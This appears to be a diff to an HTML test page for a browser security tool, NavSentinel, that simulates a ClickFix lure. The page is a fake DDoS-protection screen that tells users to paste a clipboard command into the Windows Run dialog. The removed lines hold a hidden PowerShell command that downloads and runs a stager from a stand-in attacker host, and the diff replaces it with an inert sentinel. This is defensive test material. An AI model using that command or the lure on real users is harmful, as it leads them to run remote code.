@@ -115,13 +115,13 @@
 <body>
   <h1>ClickFix 04 - Win+R Instruction Variant</h1>
   <div class="description">
-    <strong>Attack scenario:</strong> A fake DDoS protection page writes a malicious
-    command to the clipboard when the user clicks "verify". It then shows Win+R
+    <strong>Attack scenario:</strong> A fake DDoS protection page writes a visibly inert
+    synthetic sentinel to the clipboard when the user clicks "verify". It then shows Win+R
     paste instructions. This variant specifically tells the user to press Win+R
     (Windows Run dialog) and paste the command.
     <br><br>
     <strong>Expected:</strong> NavSentinel detects the ClickFix pattern: clipboard
-    write with command-like content + overlay + Win+R instruction text.
+    write + overlay + Win+R instruction text.
   </div>
 
   <div id="ddos-overlay">
@@ -156,10 +156,9 @@
     var statusEl = document.getElementById("status");
 
     verifyBtn.addEventListener("click", function() {
-      // Malicious command targeting Windows Run dialog
-      var fakeCommand = 'powershell -w hidden -ep bypass -c "IEX(IWR https://evil.example/stager.ps1)"';
+      var syntheticClipboardValue = "NAVSENTINEL_SENTINEL_DO_NOT_RUN";
 
-      navigator.clipboard.writeText(fakeCommand).then(function() {
+      navigator.clipboard.writeText(syntheticClipboardValue).then(function() {
         checkboxIcon.style.background = "#238636";
         checkboxIcon.innerHTML = "&#10003;";
         checkboxIcon.style.color = "#fff";
